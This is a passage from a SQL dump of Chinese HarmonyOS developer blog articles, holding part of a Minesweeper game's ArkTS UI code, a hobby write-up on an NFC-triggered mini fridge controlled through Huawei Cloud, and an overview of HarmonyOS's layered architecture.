            <span class=\"hljs-keyword\">this</span>.isCountDown = <span class=\"hljs-literal\">false</span>\n                  }<span class=\"hljs-keyword\">else</span>{\n                    <span class=\"hljs-keyword\">this</span>.isCountDown = <span class=\"hljs-literal\">true</span>\n                  }\n                }\n              })\n            }\n          }, day_column =&gt; day_column)\n        }, day_row =&gt; day_row)\n      }\n      .columnsTemplate(<span class=\"hljs-keyword\">this</span>.row == <span class=\"hljs-number\">12</span> ? <span class=\"hljs-string\">\'1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr\'</span> :\n        <span class=\"hljs-keyword\">this</span>.row == <span class=\"hljs-number\">16</span> ? <span class=\"hljs-string\">\'1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr\'</span> : <span class=\"hljs-string\">\'1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr\'</span>)\n      .rowsTemplate(<span class=\"hljs-keyword\">this</span>.column == <span class=\"hljs-number\">12</span> ? <span class=\"hljs-string\">\'1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr\'</span> :\n          <span class=\"hljs-keyword\">this</span>.column == <span class=\"hljs-number\">16</span> ? <span class=\"hljs-string\">\'1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr\'</span> : <span class=\"hljs-string\">\'1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr\'</span>)\n      .columnsGap(<span class=\"hljs-number\">2</span>)\n      .rowsGap(<span class=\"hljs-number\">2</span>)\n      .width(<span class=\"hljs-number\">355</span>)\n      .backgroundColor(<span class=\"hljs-string\">\'#8CC8F5\'</span>)\n      .height(<span class=\"hljs-number\">355</span>)\n      .margin({ top: <span class=\"hljs-number\">10</span> })\n\n      Row(){\n        setbtn({ str: <span class=\"hljs-string\">\'翻  开\'</span>, col: <span class=\"hljs-string\">\'2\'</span>, sta: $statesBtn })\n        setbtn({ str: <span class=\"hljs-string\">\'插  旗\'</span>, col: <span class=\"hljs-string\">\'3\'</span>, sta: $statesBtn })\n      }\n      Button(<span class=\"hljs-string\">\'重新开始\'</span>, { type: ButtonType.Normal, stateEffect: <span class=\"hljs-literal\">true</span> })\n        .width(<span class=\"hljs-number\">150</span>)\n        .height(<span class=\"hljs-number\">50</span>)\n        .borderRadius(<span class=\"hljs-number\">8</span>)\n        .borderColor(<span class=\"hljs-string\">\'#6379A8\'</span>)\n        .borderWidth(<span class=\"hljs-number\">2</span>)\n        .fontSize(<span class=\"hljs-number\">26</span>)\n        .fontWeight(<span class=\"hljs-number\">700</span>)\n        .fontColor(<span class=\"hljs-string\">\'#1E2B46\'</span>)\n        .backgroundColor(<span class=\"hljs-string\">\'#CBD8E8\'</span>)\n        .margin(<span class=\"hljs-number\">10</span>)\n        .onClick(() =&gt; {\n          clearInterval(timeoutID)\n          <span class=\"hljs-keyword\">this</span>.statesBtn = <span class=\"hljs-number\">1</span>\n          <span class=\"hljs-keyword\">this</span>.success = <span class=\"hljs-literal\">false</span>\n          <span class=\"hljs-keyword\">this</span>.over = <span class=\"hljs-literal\">true</span>\n          <span class=\"hljs-keyword\">this</span>.time = <span class=\"hljs-number\">0</span>\n          <span class=\"hljs-keyword\">this</span>.mine = router.getParams().difficulty\n          <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.isCountDown){\n            <span class=\"hljs-keyword\">this</span>.isCountDown = <span class=\"hljs-literal\">false</span>\n          }<span class=\"hljs-keyword\">else</span>{\n            <span class=\"hljs-keyword\">this</span>.isCountDown = <span class=\"hljs-literal\">true</span>\n          }\n          <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-keyword\">this</span>.row; i++){\n            <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-keyword\">this</span>.column; j++){\n              <span class=\"hljs-keyword\">this</span>.statesGrids[i][j] = <span class=\"hljs-number\">0</span>\n            }\n          }\n          <span class=\"hljs-keyword\">this</span>.initialize()\n        })\n    }\n    .width(<span class=\"hljs-string\">\'100%\'</span>)\n    .height(<span class=\"hljs-string\">\'100%\'</span>)\n    .backgroundColor(<span class=\"hljs-string\">\'#D6DDE7\'</span>)\n  }\n}\n\n@Component\nstruct setImage {\n  private str: string\n\n  build() {\n    Image($rawfile(<span class=\"hljs-keyword\">this</span>.str))\n      .height(<span class=\"hljs-number\">50</span>)\n      .width(<span class=\"hljs-number\">50</span>)\n      .scale({ x: <span class=\"hljs-number\">0.9</span>, y: <span class=\"hljs-number\">0.9</span> })\n      .margin({ left:<span class=\"hljs-number\">10</span>, top: <span class=\"hljs-number\">3</span> })\n  }\n}\n\n@Component\nstruct setText {\n  @Link num: number\n\n  build() {\n    Text(<span class=\"hljs-keyword\">this</span>.num.toString())\n      .width(<span class=\"hljs-number\">60</span>)\n      .height(<span class=\"hljs-number\">30</span>)\n      .borderRadius(<span class=\"hljs-number\">10</span>)\n      .borderColor(<span class=\"hljs-string\">\'#4162AA\'</span>)\n      .borderWidth(<span class=\"hljs-number\">1</span>)\n      .fontSize(<span class=\"hljs-number\">26</span>)\n      .textAlign(TextAlign.Center)\n      .fontWeight(<span class=\"hljs-number\">700</span>)\n      .fontColor(<span class=\"hljs-string\">\'#FFFFFF\'</span>)\n      .backgroundColor(<span class=\"hljs-string\">\'#4162AA\'</span>)\n      .margin({ left:<span class=\"hljs-number\">3</span>, top: <span class=\"hljs-number\">5</span> })\n      .padding(<span class=\"hljs-number\">0</span>)\n  }\n}\n\n@Component\nstruct setbtn {\n  private str: string\n  private col: string\n  @Link sta: number\n\n  build() {\n    Button(<span class=\"hljs-keyword\">this</span>.str, { type: ButtonType.Normal, stateEffect: <span class=\"hljs-literal\">true</span> })\n      .width(<span class=\"hljs-number\">130</span>)\n      .height(<span class=\"hljs-number\">50</span>)\n      .borderRadius(<span class=\"hljs-number\">8</span>)\n      .borderColor(<span class=\"hljs-string\">\'#6379A8\'</span>)\n      .borderWidth(<span class=\"hljs-number\">2</span>)\n      .fontSize(<span class=\"hljs-number\">26</span>)\n      .fontWeight(<span class=\"hljs-number\">700</span>)\n      .fontColor(<span class=\"hljs-string\">\'#1E2B46\'</span>)\n      .backgroundColor(colors[<span class=\"hljs-keyword\">this</span>.col + <span class=\"hljs-keyword\">this</span>.sta])\n      .margin(<span class=\"hljs-number\">10</span>)\n      .onClick(() =&gt; {\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.col == <span class=\"hljs-string\">\'2\'</span>){\n          <span class=\"hljs-keyword\">this</span>.sta = <span class=\"hljs-number\">1</span>\n        }<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.col == <span class=\"hljs-string\">\'3\'</span>){\n          <span class=\"hljs-keyword\">this</span>.sta = <span class=\"hljs-number\">0</span>\n        }\n      })\n  }\n}\n\n@CustomDialog\nstruct CustomDialogExample {\n  controller: CustomDialogController\n  @Link success: boolean\n  @Link difficulty: number\n  @Link time: number\n\n  build() {\n    Column() {\n      Text(<span class=\"hljs-keyword\">this</span>.success ? <span class=\"hljs-string\">\'挑战成功\'</span> : <span class=\"hljs-string\">\'挑战失败\'</span>)\n        .width(<span class=\"hljs-string\">\'100%\'</span>)\n        .fontSize(<span class=\"hljs-number\">28</span>)\n        .fontWeight(<span class=\"hljs-number\">900</span>)\n        .fontColor(<span class=\"hljs-string\">\'#FFFFFF\'</span>)\n        .textAlign(TextAlign.Center)\n        .margin({ top: <span class=\"hljs-number\">5</span>, bottom: <span class=\"hljs-number\">5</span> })\n      Text(<span class=\"hljs-string\">\'当前难度:\'</span> + (<span class=\"hljs-keyword\">this</span>.difficulty == <span class=\"hljs-number\">10</span> ? <span class=\"hljs-string\">\'初级\'</span> : <span class=\"hljs-keyword\">this</span>.difficulty == <span class=\"hljs-number\">30</span> ? <span class=\"hljs-string\">\'中级\'</span> :\n      <span class=\"hljs-keyword\">this</span>.difficulty == <span class=\"hljs-number\">50</span> ? <span class=\"hljs-string\">\'高级\'</span> : <span class=\"hljs-string\">\' \'</span>))\n        .width(<span class=\"hljs-string\">\'100%\'</span>)\n        .fontSize(<span class=\"hljs-number\">26</span>)\n        .fontWeight(<span class=\"hljs-number\">600</span>)\n        .fontColor(<span class=\"hljs-string\">\'#1E2B46\'</span>)\n        .textAlign(TextAlign.Center)\n        .margin({ top: <span class=\"hljs-number\">5</span>, bottom: <span class=\"hljs-number\">5</span> })\n      Text(<span class=\"hljs-string\">\'用时：\'</span> + (<span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time / <span class=\"hljs-number\">3600</span>) &lt; <span class=\"hljs-number\">10</span> ? <span class=\"hljs-string\">\'0\'</span> + <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time / <span class=\"hljs-number\">3600</span>).toString() :  <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time / <span class=\"hljs-number\">3600</span>).toString())\n      + <span class=\"hljs-string\">\':\'</span> + (<span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time % <span class=\"hljs-number\">3600</span> / <span class=\"hljs-number\">60</span>) &lt; <span class=\"hljs-number\">10</span> ? <span class=\"hljs-string\">\'0\'</span> + <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time % <span class=\"hljs-number\">3600</span> / <span class=\"hljs-number\">60</span>).toString() : <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time % <span class=\"hljs-number\">3600</span> / <span class=\"hljs-number\">60</span>).toString())\n      + <span class=\"hljs-string\">\':\'</span> + (<span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time % <span class=\"hljs-number\">3600</span> % <span class=\"hljs-number\">60</span>) &lt; <span class=\"hljs-number\">10</span> ? <span class=\"hljs-string\">\'0\'</span> + <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time % <span class=\"hljs-number\">3600</span> % <span class=\"hljs-number\">60</span>).toString() : <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-keyword\">this</span>.time % <span class=\"hljs-number\">3600</span> % <span class=\"hljs-number\">60</span>).toString()))\n        .width(<span class=\"hljs-string\">\'100%\'</span>)\n        .fontSize(<span class=\"hljs-number\">26</span>)\n        .fontWeight(<span class=\"hljs-number\">600</span>)\n        .fontColor(<span class=\"hljs-string\">\'#1E2B46\'</span>)\n        .textAlign(TextAlign.Center)\n        .margin({ top: <span class=\"hljs-number\">5</span>, bottom: <span class=\"hljs-number\">5</span> })\n      Row() {\n        Button(<span class=\"hljs-string\">\"返回主页\"</span>, { type: ButtonType.Normal, stateEffect: <span class=\"hljs-literal\">true</span> })\n          .width(<span class=\"hljs-number\">130</span>)\n          .height(<span class=\"hljs-number\">50</span>)\n          .borderRadius(<span class=\"hljs-number\">8</span>)\n          .borderColor(<span class=\"hljs-string\">\'#6379A8\'</span>)\n          .borderWidth(<span class=\"hljs-number\">2</span>)\n          .fontSize(<span class=\"hljs-number\">22</span>)\n          .fontWeight(<span class=\"hljs-number\">600</span>)\n          .fontColor(<span class=\"hljs-string\">\'#1E2B46\'</span>)\n          .backgroundColor(<span class=\"hljs-string\">\'#D6DDE7\'</span>)\n          .margin({ left: <span class=\"hljs-number\">25</span>, top: <span class=\"hljs-number\">5</span>, bottom: <span class=\"hljs-number\">5</span> })\n          .onClick(() =&gt; {\n            router.back()\n          })\n        Button(<span class=\"hljs-string\">\"返回界面\"</span>, { type: ButtonType.Normal, stateEffect: <span class=\"hljs-literal\">true</span> })\n          .width(<span class=\"hljs-number\">130</span>)\n          .height(<span class=\"hljs-number\">50</span>)\n          .borderRadius(<span class=\"hljs-number\">8</span>)\n          .borderColor(<span class=\"hljs-string\">\'#6379A8\'</span>)\n          .borderWidth(<span class=\"hljs-number\">2</span>)\n          .fontSize(<span class=\"hljs-number\">22</span>)\n          .fontWeight(<span class=\"hljs-number\">600</span>)\n          .fontColor(<span class=\"hljs-string\">\'#1E2B46\'</span>)\n          .backgroundColor(<span class=\"hljs-string\">\'#D6DDE7\'</span>)\n          .margin({ left: <span class=\"hljs-number\">25</span>, top: <span class=\"hljs-number\">5</span>, bottom: <span class=\"hljs-number\">5</span> })\n          .onClick(() =&gt; {\n            <span class=\"hljs-keyword\">this</span>.controller.close()\n          })\n      }\n      .width(<span class=\"hljs-string\">\'100%\'</span>)\n    }.backgroundColor(<span class=\"hljs-string\">\'#CBD2E4\'</span>)\n  }\n}</code></pre>', '', 2, ',1,28,', '原创', '公开', '已发布', '精华', 65166, 'Top', '', 0, '2021-12-01 23:06:06', '2021-12-02 22:36:01');
INSERT INTO `article` VALUES (3, '基于华为云控制的鸿蒙碰一碰小冰柜', 2, '概述', '<h1>1、构思概述</h1>\n<p>&nbsp; &nbsp; &nbsp; &nbsp;这个小冰柜诞生于前不久的炎热夏季......长话短说，我让同学去学校超市帮忙买饮料&mdash;&mdash;&gt;同学买了一瓶常温还有点热热的给我&mdash;&mdash;&gt;我心中莫名感动（wocao）。这件&rdquo;事故&ldquo;发生之后我感动了挺大一会儿，寻思用近期学的鸿蒙设备开发做一个小冰柜，用它来自己冰冰饮料来表示我的不满足（我想要喝冰的）。</p>\n<p>&nbsp; &nbsp; &nbsp; &nbsp;以下是我的项目结构图，图中展示了冰柜的组成及功能</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130205158.46435513091735929534968378633310:50521130152922:2800:8DD9715662E408AED5CD2CAEAC402F64947618719A5985E119F31A4FEEBA569D.png\" alt=\"image.png\" /></span></p>\n<p>&nbsp; &nbsp; &nbsp; &nbsp;以下是成品图，最后一张是看上去是胡搅蛮缠的线路图嘛，嘿嘿</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130190900.96986433747125122477707346470703:50521130152922:2800:BD5A72C4A249544CDF9A4DE51DDD543FEA2FEEC9019C3B2673628B126D4BC3E2.gif\" alt=\"cke_9015.gif\" /></span>​&nbsp; &nbsp; &nbsp;&nbsp;<span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130190900.49068791208827591712961437249782:50521130152922:2800:F24F2DDC1B681C8BA763914F2022D6EFC9ACB9F60A698DAC9269E21846220CAF.gif\" alt=\"cke_9016.gif\" /></span>​&nbsp;&nbsp;<span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211201005015.10102348575652306068150307779417:50521130152922:2800:2214ECE7AEAC3006721401442980B8E002531093C17AD3440EFD92E74112352C.jpg\" alt=\"2.jpg\" /></span>&nbsp; &nbsp;<span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211201005047.31670672478610284300864054760258:50521130152922:2800:12133DCCB3F62B3E0964E75F60567A21782BA323BAB4BF0F6093BADC3F71860D.jpg\" alt=\"1.jpg\" /></span>&nbsp; &nbsp;<span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211201005102.31564868237189282409324026453801:50521130152922:2800:E699CACF5A7523826FF71B3E47D86176E71D948178347E0DEF872C50C16558CD.jpg\" alt=\"3.jpg\" /></span>&nbsp; &nbsp;<img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211201005127.70995950306365005219592283597062:50521130152922:2800:93835064709E1569574D06085424DEFF3BEF77ABD609D4BA811CF007A2C88CAB.jpg\" /><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211201005239.90508696671593877410192108632115:50521130152922:2800:78BD5EC1DFC4B74874EB85BFE1CD49DF391BB5EF21C261259CE5CB31D75B13FE.gif\" alt=\"cke_6980.gif\" /></span>​</p>\n<h1>2、实践过程</h1>\n<h2>2.1 硬件实现</h2>\n<p>说干就干，我查找了相关资料，进了某宝采购了以下制作小冰柜的材料</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130190533.06022655467731777242013443160654:50521130152922:2800:A2165ACA4975E7C4BB2CC949A55D7DC0B8A8C9590B38EC43F4BBC659C7465606.png\" alt=\"3.png\" /></span></p>\n<h2>2.2、Hi3861接入华为云平台</h2>\n<h3>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<strong>2.2.1 登录华为云官网进入控制台</strong>&nbsp; &nbsp; &nbsp; &nbsp;</h3>\n<h3>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span class=\"easyimage easyimage-align-right\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130192209.98055260753152394730312449901811:50521130152922:2800:7F648B6E2BDBEF75F97B952C7450D603E98C9B2161F4BCF9F3F6410AE55CC936.png\" alt=\"image.png\" /></span></h3>\n<h3>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<strong>2.2.2 进入控制台后，根据指引及开发文档完成产品的定义&mdash;&mdash;&gt;设备的定义</strong></h3>\n<h3>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span class=\"easyimage easyimage-align-right\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130202945.25017174150542365233297875919441:50521130152922:2800:F254725A0477E4C913B51C444BBA92B52C79ABB0D27F38DFF3A9F2A5976560FA.png\" alt=\"image.png\" /></span></h3>\n<h3>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<strong>2.2.3 Hi3861开发板基于paho-mqtt与华为云平台进行对接</strong></h3>\n<h2>2.3、NFC碰一碰拉起应用实现应用实现</h2>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;由于我还未涉及到NFC碰一碰拉起很厉害的FA应用的开发学习，应用部分我是用华为云设备接入平台对Hi386</p>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1实现控制的，并且将我的华为云控制台封装成了APP</p>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;这里拉起的应用并非FA应用，而是借助了NFC工具，添加了拉起了自定义的应用即前面封装好的华为云控制台</p>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; （嘿嘿&gt;_&lt;，纯属过过瘾，因为本身不是专注于应用软件开发的)</p>\n<h3>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<strong>2.3.1 标签写入</strong></h3>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;将\"拉起华为云控制台拉起任务\"信息写入NFC标签</p>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130183945.46311085243886381590305808848689:50521130152922:2800:204501A97E59F1CFF19D5BA6CBAD1E1E35072878EE5E0A4446FAC5AF9CC1929D.jpg\" />​</p>\n<h3>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<strong>2.3.2&nbsp;NFC碰一碰标签拉起演示</strong></h3>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<strong>手机开启NFC功能，靠近标签自动拉起控制台</strong></p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130185231.74275260517512000658407833686714:50521130152922:2800:09DAAB57B36172DE590FF37CB42AB6EBBD89238FAE019DF994A4B9B52F25D391.gif\" alt=\"4p3mz-9ecs8.gif\" /></span></p>\n<h3>&nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<strong>2.3.3&nbsp;华为云控制台页面&nbsp;</strong></h3>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<strong>（1）设备信息展示</strong></p>\n<h2>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span class=\"easyimage easyimage-align-right\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211130190244.21760140098980966630821445281844:50521130152922:2800:5552D7232DD4E5AA4C4D5A606A351D0A83E86C6CF326A9044B7231D4A4350C42.jpg\" alt=\"IMG_20211130_173646.jpg\" /></span>&nbsp;</h2>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<strong>（2）</strong><span class=\"cke-article\"><strong>冰柜状态展示</strong></span></p>\n<h2>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;<span class=\"easyimage easyimage-align-right\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211201003843.91180844332195005417681274588656:50521130152922:2800:2494B222A2FFE285B099B7B219EB58CCB2EB23E743A7D03EB79D0794E6367EE5.jpg\" alt=\"Screenshot_2021-10-24-16-00-02-39_99c04817c0de565.jpg\" /></span></h2>\n<h2>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<strong><span class=\"cke-article\">（3)&nbsp; 华为云端温度控制</span></strong></h2>\n<h2>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span class=\"easyimage easyimage-align-right\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/454/201/593/2850086000454201593.20211201003926.84542095660489459126402748113853:50521130152922:2800:CF8D617F633E86B5AA4CC0336B01729B8FC3FAEE443DA1AE4FFC176A12F30341.jpg\" alt=\"Screenshot_2021-10-24-16-00-11-18_99c04817c0de565.jpg\" /></span></h2>\n<h1>3、最终实现效果</h1>\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;点击观看视频：<a href=\"https://www.bilibili.com/video/BV1o44y1a7Qr?from=search&amp;seid=6554854687691950624&amp;spm_id_from=333.337.0.0\" target=\"_self\" rel=\"nofollow\">最终效果演示</a></p>', '', 3, ',28,2,', '原创', '公开', '已发布', '推荐', 8956, 'Top', '', 0, '2021-12-01 23:30:45', '2021-12-01 23:30:45');
INSERT INTO `article` VALUES (4, 'HarmonyOS系统架构', 6, '概述', '<p>HarmonyOS采用分层架构，一共四层，从上往下分别为：内核层、系统服务层、框架层和应用层 。</p>\n<p>系统功能按照&ldquo;系统&gt;子系统&gt;功能/模块&rdquo;逐级展开，在多设备部署场景下，支持根据实际需求裁剪某些非必要的子系统或功能/模块。</p>\n<p><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/478/076/345/2850086000478076345.20211127205720.71419899171595713924079181824435:50521130155006:2800:0695B4E2939A2C871D1EC8AFE876D34999DF711F58CA6DD838536D11041A702F.png\" /></p>\n<p>&nbsp;</p>\n<p><strong>内核层：</strong></p>\n<p><strong><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/478/076/345/2850086000478076345.20211127205954.84302943726603774436347710705587:50521130155006:2800:FB948225F5C27C8BA2E57E3EE8C363A30CF48593DEED75CE388DEC9BC55839B1.jpeg\" /></strong></p>\n<p>&nbsp;</p>\n<p>一、内核子系统</p>\n<p>HarmonyOS采用多内核设计，支持针对不同资源受限设备，选用审核的OS内核为上层提供基础操作能力。</p>\n<p>&nbsp;</p>\n<p>二、驱动子系统</p>\n<p>硬件驱动框架(HDF)是HarmonyOS硬件生态开放的基础，提供统一外设访问能力和驱动开发管理框架。</p>\n<p><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/478/076/345/2850086000478076345.20211127210232.55466922717785482865258514190917:50521130155006:2800:5E077A2EF43407F11FF3544E73617A143ED931E2CAC8FD726870521500728A57.jpeg\" /></p>\n<p><br /><br /></p>\n<p><strong>系统服务层：</strong></p>\n<p>基础服务层是HarmonyOS的核心能力集合，包括适用于各类设备的基础能力以及面向特定设备的专有能力，涵盖系统基本能力子系统集、基础软件服务子系统集、增强软件服务子系统集、硬件服务子系统集。</p>\n<p>根据不同设备形态的部署环境，基础软件/增强软件/硬件服务子系统集内部可以按子系统力度裁剪，子系统还可以按功能粒度裁剪。</p>\n<p><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/478/076/345/2850086000478076345.20211127210637.46067966646490647928344881040007:50521130155006:2800:48F508195D6DC9C15B0BCC93EA9D1B5F7D5E139D9FDFDEE2C47551BF789686B4.jpeg\" /></p>\n<p>&nbsp;</p>\n<p><strong>框架层：</strong></p>\n<p><strong>为HarmonyOS应用开发提供了Java/C/C++/JS等多语言的用户程序框架和Ability框架，两种UI框架(包括适用于Java语言的Java UI框架、适用于JS语言的JS UI框架)以及各种软硬件服务。</strong></p>\n<p><strong>对外开放的多语言框架API，根据系统的组件化裁剪程度，HarmonyOS设备支持的API也会有所不同。</strong></p>\n<p><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/478/076/345/2850086000478076345.20211127210830.59622735601212037634811377927123:50521130155006:2800:9D370F33E78C4ECFD1566A76B85217AAD23FD3C48FC1F203A953CFF9784BE49A.jpeg\" /></p>\n<p>&nbsp;</p>\n<p><strong>应用层：</strong></p>\n<p><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/478/076/345/2850086000478076345.20211127210926.74441456459614855270786202687983:50521130155006:2800:E32BA727450B39D7E49DC48EA397A402AC300B8092C1D887557708BE7F951152.jpeg\" /></p>\n<p>支持基于框架层实现业务逻辑的原子化开发，构建以FA/FP为基础组成单元的应用(包括系统应用和第三方应用)。</p>\n<p>这里，FA/PA是HarmonyOS应用的基本组成单位，能够实现特定的业务功能。一个应用可以包含一个或多个FA/PA。FA有UI界面，PA无UI界面。</p>\n<p><strong>例如，一个视频通话应用：&ldquo;视频通话主界面FA&rdquo;提供UI界面以便于用户交互，&ldquo;PA1&rdquo;进行摄像头视频采集，&ldquo;PA2&rdquo;进行视频美颜处理，&ldquo;PA3&rdquo;提供超级夜景能力。FA/PA可以按需下载、加载和运行。</strong></p>', '', 4, ',3,28,', '原创', '公开', '已发布', '精华', 654, '', '', 0, '2021-12-01 23:51:36', '2021-12-02 22:52:52');
